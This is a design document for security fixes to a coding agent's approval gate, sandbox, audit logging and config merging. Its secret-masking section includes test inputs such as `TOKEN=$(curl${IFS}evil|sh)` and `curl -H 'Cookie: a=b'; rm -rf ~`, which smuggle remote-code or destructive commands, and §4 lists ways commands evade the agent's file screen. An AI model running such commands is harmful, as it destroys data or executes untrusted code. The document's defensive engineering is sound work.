# Cross-phase review P0-P5: remaining findings — design

**Date:** 2026-09-24 (rev 2: corrections from the code review of rev 1 folded in)
**Branch:** `feat/xreview-remaining` (off `main` @ `3b7834208`)
**Source:** cross-phase review P0-P5 (findings #8, #9, #10, #14, #17, #19, #20, #21, #22 and the
composite test gaps). Findings #1-#7, #12, #13, #15, #16, #18 are merged (#2203-#2207, #2219, #2222).
**Out of scope:** #11 (approvals CLI — needs its own design); simplifying #2199's all-package raw scan;
the command-safety shadow's own egress (see §1 "Not covered").

All findings were re-verified on `3b7834208`; line numbers below are from that commit.

## Rulings

| # | Ruling |
|---|---|
| #8 | Honest wording only. The raw screen stays advisory (ADR-030 "must never be grown into a general gate"). |
| #9 | Mask-or-deny for every approval channel; span-aware redaction of local audit rows; amend D18. |
| #10 | The four top-level agent-command safety keys become root-only, warn-and-ignore in a package config. The `permissions` map (including per-stage `bashApproval`) stays a per-package unit. Recorded as ADR-031. |
| #14 | Closed as a non-issue: one process, one `O_APPEND` write per row, regular file. No code. |
| #17 | Build the session's policy once at session start; a non-literal path = sandbox `unavailable`. |
| #19 | Reference+length snapshot per handler (detect, log, restore). No test-only freeze mode. |
| #20 | Fire `before_turn_end` on the error path with a new `ended` field. |
| #21 | Dedupe key gains the tool name; command-less asks get a unique key (never joined, still cancellable). |
| #22 | Document the keys; ratchet description coverage for these execution subtrees. |

## 1. Secrets in commands (#9)

### Problem

A command carrying a credential (`curl -H 'Authorization: Bearer sk-...'`) leaves the host verbatim
when it needs approval. `ask-link.ts:303-320` builds the prompt: `summary` is
`` `${req.tool} - approval required` `` and `detail` holds the verbatim command block plus
`request: ${req.summary}`. Telegram (`telegram-format.ts:117-120`, sent at `telegram.ts:194`) renders
both; the webhook plugin (`plugins/webhook.ts:255-276`) POSTs the whole request.

`req.summary` is built by `askSummary` (`runtime.ts:144-154`) and is the command again, **cut to 200
chars** (`MAX_ASK_SUMMARY_CHARS`, `:48`). The cut can split a secret so no pattern matches the
remainder. For Exec, `req.command` is absent (only Bash declares `commandField`), so the summary is the
only text shown.

The same strings land unredacted in approval-audit (`approval-audit.ts:29`, JSONL), command-safety
rows (`row.ts:12`, JSONL) and the tool-audit file (`tool-audit.ts:169-185`: ONE pretty-printed JSON
document per session, `{schemaVersion, ...header, sessionName, calls}`).

`src/logger/redact.ts` has 16 value patterns (`SECRET_VALUE_PATTERNS`, `:32-96`, private) and a private
`redactString`. Masking naively is unsafe: `Cookie\s*:\s*[^\r\n]+` runs to end of line
(`curl -H 'Cookie: a=b'; rm -rf ~`), `KEY=[^\s"',]+` swallows `TOKEN=$(curl${IFS}evil|sh)`, and PEM
spans up to 64 KB. Patterns also overlap (`ghp_` matches two patterns; `TOKEN=ghp_...`;
`Bearer eyJ...`), and the `/g` regexes carry `lastIndex`.

### Design

**`src/logger/redact.ts`:** export the pattern table as
`SECRET_VALUE_PATTERNS: readonly { readonly kind: string; readonly re: RegExp }[]` (kinds: `openai`,
`github`, `github-pat`, `npm`, `aws`, `slack`, `telegram`, `assignment`, `pem`, `jwt`, `bearer`,
`basic`, `api-key-header`, `cookie`, `url-credentials`; `ghp_` and `gh[opsu]_` both `github`).
`redactString` iterates `.re`; its output is unchanged.

**New module `src/permissions/secret-spans.ts`:**

- `SHELL_ACTIVE = /[$`;|&<>()'"\n]/`.
- `findSecretSpans(text): readonly SecretSpan[]` (`{ start, end, kind }`): run every pattern with a
  fresh `lastIndex = 0` exec loop; **skip a match whose value part starts with `$`** (for `assignment`
  and `api-key-header`: the text after the first `=` or `:`), because `TOKEN=$VAR` / `${X}` / `$(...)`
  references a secret rather than containing one; then **merge overlapping or touching intervals**
  (merged kind = the kind of the earliest-starting span).
- `maskForPrompt(text): MaskResult`,
  `MaskResult = { ok: true; masked: string; count: number } | { ok: false; reason: string }`.
  Any merged span containing a `SHELL_ACTIVE` char -> `ok: false` (masking it could hide code).
  Otherwise each span -> `[REDACTED:<kind>]`.
- `redactForRow(text): string` — for local audit rows, where nothing is approved but forensic content
  matters: each merged span is replaced **up to its first `SHELL_ACTIVE` char** (for `pem`, newline is
  not treated as shell-active), so `Cookie: a=b'; rm -rf ~` keeps `'; rm -rf ~` visible. The residual
  (secret characters after a shell-active char stay visible) is accepted and documented.
- `redactRowStrings<T>(value: T): T` — recursive walk applying `redactForRow` to every string leaf.
  No key-name blanking (unlike `redactSecrets`), so tool inputs keep their shape.

**Ask request (`src/tools/ask-request.ts`, new):** `askSummary` and `askDenyReason` move out of
`runtime.ts` (582 lines; the gate is 600). `askSummary` becomes
`askSummary(tool, scope, input): { summary: string; unshowable: boolean }`: it builds the full,
untruncated line, runs `maskForPrompt` on it, and returns the **masked** text sliced to 200 chars, or
`{ summary: "<tool> [arguments withheld: contains a secret]", unshowable: true }` when not ok.
`AskRequest` gains `readonly unshowable?: true`, set only when true.

**Ask link (`ask-link.ts` `resolve`):** after the aborted-signal check:

1. `req.unshowable === true` -> `deny("unshowable")`.
2. `maskForPrompt(req.command ?? "")`: not ok -> `deny("unshowable")`.
3. The length check uses the **masked** command plus the footer line (the raw text is never shown).
4. `runSession(req, session, shown)` gets `shown = { command?: string; maskedCount: number }`; the
   `detail` block renders `shown.command` and, when `maskedCount > 0`, the line
   `N secret value(s) masked; the approved command contains them`. `onRemember(req)` and everything
   else keep the raw `req`.

The dedupe key, approvals-cache key, shadow input and executed command keep the original bytes.

**`decidedBy` union:** `AskDecidedBy` (`ask-chain.ts:19`) and ask-link's local `deny` parameter
(`:93`) gain `"unshowable"`. **Deny reason:** new `ASK_UNSHOWABLE_REASON` in `permissions/ask.ts`
("Not run: the command contains a secret that cannot be shown to the approver safely; pass it via an
environment variable instead.") and a branch in `askDenyReason`.

**Local rows:** `appendApprovalAudit` and `appendCommandSafetyRow` write
`redactRowStrings(row)`; the tool-audit `flush` writes `calls: redactRowStrings(calls)`.
`approvals.json` is **not** redacted — it must match byte-exact (D17); secrets persist there, as today.

**Docs:** ADR-030 (decidedBy list `:242-252`; D18 wording) and D18 in the workspace master plan
(`subrina-coder/projects/nax/nax-native-coding-agent-master-plan.md`, outside this repo) become "the
approval prompt shows the command verbatim except inert secret spans, or the gate denies".
`approval-audit.ts`'s header comment lists `unshowable`; `ask-link.ts`'s header notes the
`@/permissions` import is now a runtime import.

**Accepted by design:** a quoted Cookie header (`-H 'Cookie: a=b'`) always contains the closing quote
and is therefore always unshowable; any PEM block contains newlines and is always unshowable.

**Not covered:** the command-safety shadow POSTs every Bash/Exec command to its classifier; with
`allowRemote: true` that can be off-host. It must classify the real bytes (D4a), so it is documented
(§8), not masked.

### Tests

- `secret-spans`: inert `sk-`/`ghp_`/Bearer masked with kind; overlapping `TOKEN=ghp_...` -> one span;
  `TOKEN=$(gh auth token)` -> no span; `Cookie: a=b'; rm -rf ~`, `TOKEN=abc;rm`, a PEM block ->
  `ok: false`; no-secret text -> `count: 0`, unchanged; repeated calls give identical results
  (`lastIndex` safety); `redactForRow` keeps `'; rm -rf ~`; `redactRowStrings` walks nested objects.
- `askSummary`: a secret straddling char 200 is masked before the cut (no partial secret in output);
  a non-inert secret -> `unshowable: true`.
- `ask-link`: masked detail + footer reach `chain.prompt`; `unshowable` (either source) never calls
  `chain.prompt`; `onRemember` receives the raw command; dedupe still keys on the raw command.
- `askDenyReason("unshowable")` -> `ASK_UNSHOWABLE_REASON`.
- Row writers: the secret value is absent from approval-audit, command-safety and tool-audit files.

## 2. Root-scoped agent-command safety config (#10) — ADR-031

### Problem

`mergePackageConfig` (`merge.ts:96-98`) spreads `...packageOverride.execution`, so a package config
can override `execution.bashApproval`, `approvalTimeout`, `sandbox` and `commandSafety` — undocumented.
A package **profile** can too: the profile loop (`loader.ts:535-555`) deep-merges onto the merged
result, bypassing `mergePackageConfig`. Run-scope ops ignore the overrides anyway: `finish/phase.ts:
286-292` and `run-regression.ts:448-454` pass root as both `config` and `rootConfig`.

`execution.permissions` is different: a package's map **replaces** root's whole map (the spread), and
a stage's rules resolve through the merged map (`permissions.ts:213-222`: block -> `inherit` ->
`default`). A per-stage `bashApproval` cannot be pinned to root without changing which block a stage's
allow/deny come from. It therefore stays per-package, together with the rest of the map.

### Design

- **Root-only keys** (`ROOT_ONLY_EXECUTION_KEYS` in new `src/config/root-only-keys.ts`):
  `bashApproval`, `approvalTimeout`, `sandbox`, `commandSafety`. `permissions` and `permissionProfile`
  (SEC-3, `manager-complete.test.ts:288-308`) stay per-package.
- `pinRootOnlyKeys(merged: NaxConfig, root: NaxConfig, onIgnored?: (msg: string) => void): NaxConfig`
  returns `merged` with those four keys set from `root.execution`; when a merged value differs from
  root's (deep-equal), it calls `onIgnored` with
  `execution.<key> is root-only (ADR-031); the value set for package "<dir>" is ignored`.
  Takes the package dir via a 4th param `packageDir: string` for the message.
- **Call sites** (every producer of a package-merged config):
  - `loader.ts` `loadConfigForWorkdir`: after the profile loop, before `safeParse`:
    `rawMerged = pinRootOnlyKeys(rawMerged, rootConfig, warnDedupe.warn, packageDir)` — covers both the
    overlay and package profiles, warning deduped per resolution. `loader.ts` is at the 600-line gate:
    the edit is net-negative (the call and import add 2 lines; the historical `#574` comment at
    `:579-581` is removed).
  - `runtime/packages.ts:190` (`hydrate`): wrap the merge, no warning (the loader path warns).
  - `mergePackageConfig` itself does NOT pin (the loader must see the overlay's value to warn).
- **acceptance-fix-scope.ts:** only the dispatch-wiring argument changes (`:46` `config: ctx.config`).
  `effectiveConfig` stays for `cycleCtx.config` (`:62`), which fix ops read for package quality/models.
- **finish / run-regression:** unchanged behaviour; one-line comment at each root/root call: correct by
  construction under ADR-031 (whole-feature ops use root's config, including root's permissions map).
- **Comment fix:** `coding-tool-support.ts:538` ("execution.sandbox is global-only") becomes true;
  reword to cite ADR-031.
- **ADR-031 "Agent-command safety config is root-scoped"** (`docs/adr/ADR-031-root-scoped-command-safety-config.md`):
  context (the spread leak, package profiles, whole-feature ops, `interaction` already root-only),
  decision (four keys root-only, warn-and-ignore), the explicit exception (`permissions` map incl.
  per-stage `bashApproval`, and `permissionProfile`, stay per-package, with the replace-not-merge
  reason), rejected alternatives (strictest-merge across packages; per-group dispatch; hard validation
  error — nax exits 0 on validation errors; pinning per-stage modes — changes allow/deny resolution),
  consequences (no per-package stricter top-level mode — tighten root or use a per-stage mode in the
  package's permissions map; `collectEffectiveRunStageModes` stays correct, simplification deferred).
  ADR-030 gains a "See also: ADR-031" line.

### Tests

- `pinRootOnlyKeys`: each key taken from root; `onIgnored` once per differing key with the package dir;
  no call when values match; `permissions` untouched.
- `loadConfigForWorkdir`: a mono config setting each key -> root value + a warning naming the key;
  a package profile setting `execution.bashApproval` -> root value; a mono `permissions.run.bashApproval`
  -> still applied.
- `packages.hydrate`: merged view carries root's `sandbox` when the override sets one.
- acceptance-fix scope: the wiring receives `ctx.config`; `cycleCtx.config` still the package config.

## 3. Sandbox: glob characters in the repo path (#17)

`policy-builder.ts:44-54` `literal()` throws `NaxError` `SANDBOX_POLICY_NOT_LITERAL` for any resolved
path with a glob char; it runs on write roots, `denyWrite` and `denyRead` (`:88-112`). The probe builds
its own inline policy (`probe.ts:31-45`), so it passes, and the throw fires per command
(`launcher.ts:115`).

**Design:** in `resolveSessionSandbox` (`coding-tool-sandbox.ts:41-83`), after `policyFor` is defined,
call `await policyFor(args.root)` once. On a `NaxError` with code `SANDBOX_POLICY_NOT_LITERAL`, call
`warnSandboxUnavailableOnce(reason, storyId)` and return the `unavailable` state with
`reason = "[sandbox] a path in the sandbox policy contains a glob character: <path>"`. Other errors
propagate. Existing fail-closed rules then apply. Residual (documented in the function comment): a
feature directory created mid-run with a glob char still throws per command.

**Tests:** with `gitLayout`/`featurePrds` deps stubbed and a root containing `[x]`, the launcher state is
`unavailable` with the path in the reason; a normal root is `available`; a non-glob policy error still
throws.

## 4. Raw-screen wording (#8)

**Design:** rewrite `bash.ts:159-163`: the screen matches exact protected file paths only; a directory
target (`cp x .nax/`), a glob, a nested shell (`sh -c '...'` without substitution), `tar -C` / `dd of=`,
or a symlink alias also skips it; it is advisory — use the sandbox for a boundary. Keep the phrases
`coding-tool-bash.test.ts:84-100` pins (`.nax/config.json`, `.nax/features/**/prd.json`, `advisory`,
`command substitution`, ...). ADR-030 `:136`: "Three gaps" -> "Six gaps", and add gaps 4-6 (directory
targets and globs; nested shells without substitution and non-redirect writers such as `tar -C`/`dd`;
aliases through symlinks).

**Tests:** extend `coding-tool-bash.test.ts` with assertions for `directory` and `sh -c`.

## 5. Loop-event cache boundary: in-place mutation (#19)

`checkPrefixStable` / `applyHistoryPatch` (`cache-boundary.ts:3-37`) judge only returned patches. The
live arrays reach handlers: `before_turn.history`, `transform_context.messages`,
`before_turn_end.messages` (loop's `messages`) and `tools` (`before_tool`, `transform_context`).
Only built-in handlers register (`loop-handlers.ts:70-77`, anonymous arrows); dispatch is strictly
serial (no concurrent mutation).

**Design:**

- New module `loop-events/payload-guard.ts`: `snapshotArrays(payload): ArraySnapshot` records, for every
  own array-valued field, the array object, its length and a shallow copy of its element references;
  `restoreMutated(snapshot, event, handlerIndex): void` compares each array (length or any element
  reference differs), and when changed logs
  `warn("native-loop-events", "handler mutated payload in place; restored", { event, handler: index, field })`
  and restores the array **in place** (`arr.length = 0; arr.push(...saved)`), so the same array object
  keeps its original elements.
- `dispatchChain`: after the empty fast path, wrap each `await handler(current)` with
  snapshot/restore on `current`. `dispatchBeforeTool`: same, on the per-handler payload's `tools`.
- Field edits inside an element are not detected; the module docblock says so. No freeze mode (a
  frozen live payload would break the loop's own `messages.push` after a follow-up, and a frozen clone
  changes element identity that `checkPrefixStable` depends on).

**Tests:** a handler that `push`es onto `messages` and returns nothing -> warned and restored (same
array object, original length); `splice` likewise; a handler that pushes and RETURNS the same array ->
also restored (pinned: in-place is never honoured); a returned new array -> unaffected; `before_tool`
`tools.push` -> restored.

## 6. `before_turn_end` on the error path (#20)

`turn-loop.ts:386` dispatches inside the `try`; the catch (`:414-433`) saves, records usage and
rethrows. #2222 added a throw at `:370-371`. `deps.signal` is `AbortSignal.any` over the caller's
signal, the idle watchdog and the whole-turn deadline, so an abort can be any of those.

**Design:**

- `BeforeTurnEndPayload` (`loop-events/types.ts:177`) gains
  `readonly ended: "completed" | "aborted" | "errored"`; the in-try dispatch passes `"completed"` (a
  stop — spin, budget, deadline — stays `"completed"` with `stopped: true`, as documented on the field).
- New module `src/agents/native/session/turn-end-event.ts`:
  `dispatchTurnEndOnError(loopEvents, payload: Omit<BeforeTurnEndPayload, "ended">, signal?): Promise<void>`
  dispatches with `ended: signal?.aborted ? "aborted" : "errored"`, awaits it, and ignores the result
  (warn `"before_turn_end followUp ignored on error path"` when `followUp` is set).
- The catch calls it first, before `saveTranscript`. It fires once per turn ending; a turn that honoured
  a follow-up and later throws has two endings and two events. Handlers are awaited without a timeout
  (only built-ins exist; documented).

**Tests:** a `complete` that throws -> one event, `ended: "errored"`, rethrown error is the same object;
an aborted signal -> `ended: "aborted"`; a handler returning `followUp` on the error path -> ignored,
warned; normal completion payload has `ended: "completed"`.

## 7. Ask dedupe key (#21)

`ask-link.ts:430-434` keys on `stage\0command`; command-less asks (Write/Edit/path tools, argv-only
Exec) share `stage\0`. `cancel()` (`settleAllUnavailable`, `:479-494`) and settle-time cleanup walk
`liveSessions`, so a session must stay in the map.

**Design:** create the session first, then `key = command === "" ? "\u0001" + session.id :
stage + "\0" + tool + "\0" + command`. A command-less ask never finds an existing entry (unique key) but
is still in `liveSessions` for cancel and cleanup. This edit follows §1's changes in the same function.

**Tests:** two concurrent command-less asks -> two prompts; two identical Bash asks -> one prompt, both
waiters settle; the same command under two tools -> two prompts; `cancel()` settles a pending
command-less ask.

## 8. Docs (#22) and #14 close-out

- `src/cli/config-descriptions.ts` (`FIELD_DESCRIPTIONS`, flat dotted keys): add `execution.bashApproval`,
  `execution.approvalTimeout`, `execution.sandbox`, `.enabled`, `.backend`, `.filesystem`,
  `.filesystem.allowWrite`, `.filesystem.denyRead`, `.network`, `.network.allowedDomains`,
  `execution.commandSafety`, `.shadow`, `.shadow.url`, `.shadow.timeoutMs`, `.shadow.authEnv`,
  `.shadow.allowRemote`, and `execution.permissions.<stage>.bashApproval` (placeholder form, precedent
  `mcp.servers.<id>.timeoutMs`). The four root-only keys say "root-only (ADR-031)";
  `.shadow.allowRemote` says it sends every command verbatim off-host.
- `docs/guides/configuration.md`: a "Bash approval, sandbox and command safety" section;
  `docs/guides/permissions.md` "See also" links it and ADR-031.
- **Ratchet** in `test/unit/cli/config-descriptions.test.ts`: a small recursive walker over
  `ExecutionConfigSchema.shape.{sandbox,commandSafety}` (unwrapping optional/default/prefault/effects)
  asserts every key path has a description, plus the explicit top-level keys.
- #14: closed in the review status doc with the evidence (single process; `fs/promises.appendFile`
  opens `O_APPEND`; one write per row).

## 9. Composite test gaps (test code only)

| Gap | File | How |
|---|---|---|
| escalate + sandbox + shadow on one command: the same bytes at prompt, cache write, shadow and wrapped argv | `test/integration/permissions/bash-deny-suite.test.ts` | extend its `session()` with an optional `launcher` (fake backend `enforce`), a recording shadow via `createCommandShadow`, an `askResolver` that records requests |
| human-approved, then sandbox-denied write to a protected path | `test/integration/sandbox/sandbox-live.test.ts` | extend its `bash()` helper with optional `bashApproval` + `askResolver`; escalate + allow, then `cd -P .nax && echo x > config.json`; file unchanged. Real backend; skips with reason |
| cache hit under sandbox still runs wrapped | `test/integration/permissions/approval-gate.test.ts` | `sandboxEnabled: true`, fake-backend launcher; second call is a cache hit and the backend's `calls` grows |
| loop events around a permission ask | `test/unit/agents/native/session/loop-events/turn-lifecycle.test.ts` | a coding tool whose ask goes through `interactionHandler.onInteraction` held on a deferred; assert `before_tool` fires before the ask and `after_tool` only after it settles, nothing in between |
| sandbox wrap throw through `runtime.callTool` | `test/unit/tools/runtime-sandbox-argv.test.ts` | `buildCodingToolSupport` with `createCommandLauncher({ state: available, backend: makeFakeSandboxBackend("throw"), policyFor })` and a sink: error content, audit row, file not created |

(`ask_human` fires no `before_tool`/`after_tool` by design, `turn-tool-batch.ts:135-155`, hence the
permission ask in row 4.)

## Constraints

- File-size gate 600 (src) / 800 (test). `loader.ts` = 600 (net-negative edit); `runtime.ts` = 582
  (ask helpers move out); new logic in new modules.
- Single test file: `timeout 60 bun test <path> --timeout=5000` (the `run-tests.ts` runner ignores path
  args; bare uncapped `bun test` is forbidden). Gates: `bun run test`, `bun run typecheck`,
  `bun run check:all` (typecheck is not in `check:all`).
- No billed runs; executed in-session from the writing-plans plan.

## Success criteria

- Every item above has its tests, written first and green.
- `bun run test`, `bun run typecheck`, `bun run check:all` green.
- ADR-031 present; ADR-030 and D18 amended; review status doc updated (#8 #9 #10 #14 #17 #19 #20 #21
  #22 closed by this branch, #11 still open).
